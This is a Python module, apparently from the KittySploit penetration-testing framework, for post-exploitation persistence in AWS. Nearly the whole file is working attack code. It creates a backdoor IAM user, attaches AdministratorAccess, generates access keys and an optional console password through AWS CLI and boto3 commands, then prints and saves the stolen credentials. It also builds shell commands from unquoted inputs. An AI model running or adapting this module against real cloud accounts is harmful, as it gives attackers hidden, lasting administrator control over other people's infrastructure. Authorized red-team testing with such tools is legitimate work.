#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AWS IAM Backdoor User Module
Author: KittySploit Team
Version: 1.0.0

This module creates a persistent backdoor IAM user with administrator access.
WARNING: This is for authorized penetration testing only.
"""

from kittysploit import *
import json
from core.output_handler import print_info, print_success, print_error, print_warning

class Module(Post):
    """Create a persistent IAM backdoor user"""
    
    __info__ = {
        "name": "IAM Backdoor User",
        "description": "Create a persistent IAM user with administrator access",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "session_type": SessionType.AWS,
    }
    
    username = OptString("kittysploit_backdoor", "Username for backdoor user", False)
    policy_arn = OptString("arn:aws:iam::aws:policy/AdministratorAccess", "Policy ARN to attach", False)
    create_access_key = OptBool(True, "Create access keys for the user", False)
    create_login_profile = OptBool(False, "Create console login profile (requires password)", False)
    password = OptString("", "Password for console login (if create_login_profile=true)", False)
    output_file = OptString("", "Output file to save credentials (JSON format)", False)
    
    def run(self):
        """Run the backdoor user creation"""
        try:
            print_warning("⚠️  WARNING: This module creates a persistent backdoor!")
            print_warning("⚠️  Only use on systems you are authorized to test!")
            print_info("=" * 80)
            
            results = {}
            username = self.username.value
            
            print_info(f"\n[1] Creating backdoor user: {username}")
            
            # Create user
            user_created = self._create_user(username)
            if not user_created:
                print_error("Failed to create user (may already exist or lack permissions)")
                # Try to continue anyway in case user already exists
            else:
                results['user_created'] = True
                print_success(f"User created: {username}")
            
            # Attach administrator policy
            print_info(f"\n[2] Attaching administrator policy...")
            policy_attached = self._attach_policy(username, self.policy_arn.value)
            if policy_attached:
                results['policy_attached'] = True
                print_success("Administrator policy attached")
            else:
                print_error("Failed to attach policy")
                return False
            
            # Create access keys
            if self.create_access_key.value:
                print_info(f"\n[3] Creating access keys...")
                access_keys = self._create_access_keys(username)
                if access_keys:
                    results['access_keys'] = access_keys
                    print_success("Access keys created!")
                    print_warning("⚠️  SAVE THESE CREDENTIALS SECURELY:")
                    print_info(f"  Access Key ID: {access_keys.get('AccessKeyId')}")
                    print_info(f"  Secret Access Key: {access_keys.get('SecretAccessKey')}")
                else:
                    print_error("Failed to create access keys")
            
            # Create login profile
            if self.create_login_profile.value:
                password = self.password.value
                if not password:
                    print_warning("Password not provided, skipping login profile creation")
                else:
                    print_info(f"\n[4] Creating console login profile...")
                    login_created = self._create_login_profile(username, password)
                    if login_created:
                        results['login_profile'] = True
                        print_success("Console login profile created")
                        print_info(f"  Username: {username}")
                        print_info(f"  Password: {password}")
                    else:
                        print_error("Failed to create login profile")
            
            # Summary
            print_info("\n" + "=" * 80)
            print_info("BACKDOOR CREATION SUMMARY")
            print_info("=" * 80)
            print_success("Backdoor user created successfully")
            print_warning("⚠️  This user has administrator access!")
            print_warning("⚠️  Ensure credentials are stored securely!")
            
            if results.get('access_keys'):
                print_info("\nAccess Key Credentials:")
                print_info(f"  AWS_ACCESS_KEY_ID={results['access_keys'].get('AccessKeyId')}")
                print_info(f"  AWS_SECRET_ACCESS_KEY={results['access_keys'].get('SecretAccessKey')}")
            
            # Save to file if requested
            if self.output_file.value:
                try:
                    with open(self.output_file.value, 'w') as f:
                        json.dump(results, f, indent=2, default=str)
                    print_success(f"Credentials saved to {self.output_file.value}")
                    print_warning("⚠️  Secure this file immediately!")
                except Exception as e:
                    print_error(f"Failed to save credentials: {e}")
            
            return True
            
        except Exception as e:
            print_error(f"Error during backdoor creation: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _create_user(self, username):
        """Create IAM user"""
        cmd = f"aws iam create-user --user-name {username} 2>&1"
        result = self.cmd_execute(cmd)
        
        if 'error' in result.lower():
            if 'alreadyexists' in result.lower():
                print_warning(f"User {username} already exists")
                return True  # User exists, continue
            return False
        
        return True
    
    def _attach_policy(self, username, policy_arn):
        """Attach policy to user"""
        cmd = f"aws iam attach-user-policy --user-name {username} --policy-arn {policy_arn} 2>&1"
        result = self.cmd_execute(cmd)
        
        if 'error' in result.lower():
            return False
        
        return True
    
    def _create_access_keys(self, username):
        """Create access keys for user"""
        cmd = f"aws iam create-access-key --user-name {username} 2>&1"
        result = self.cmd_execute(cmd)
        
        if result:
            try:
                data = json.loads(result)
                access_key = data.get('AccessKey', {})
                return {
                    'AccessKeyId': access_key.get('AccessKeyId'),
                    'SecretAccessKey': access_key.get('SecretAccessKey')
                }
            except:
                pass
        
        # Try Python boto3
        python_cmd = f"""
python3 -c "
import boto3, json
try:
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName='{username}')
    key = response.get('AccessKey', {{}})
    print(json.dumps({{
        'AccessKeyId': key.get('AccessKeyId'),
        'SecretAccessKey': key.get('SecretAccessKey')
    }}))
except Exception as e:
    print('ERROR:', str(e))
" 2>/dev/null
"""
        result = self.cmd_execute(python_cmd)
        if result and 'ERROR' not in result:
            try:
                return json.loads(result)
            except:
                pass
        return None
    
    def _create_login_profile(self, username, password):
        """Create console login profile"""
        cmd = f"aws iam create-login-profile --user-name {username} --password {password} --password-reset-required 2>&1"
        result = self.cmd_execute(cmd)
        
        if 'error' in result.lower():
            if 'alreadyexists' in result.lower():
                # Try to update instead
                cmd = f"aws iam update-login-profile --user-name {username} --password {password} 2>&1"
                result = self.cmd_execute(cmd)
                if 'error' not in result.lower():
                    return True
            return False
        
        return True


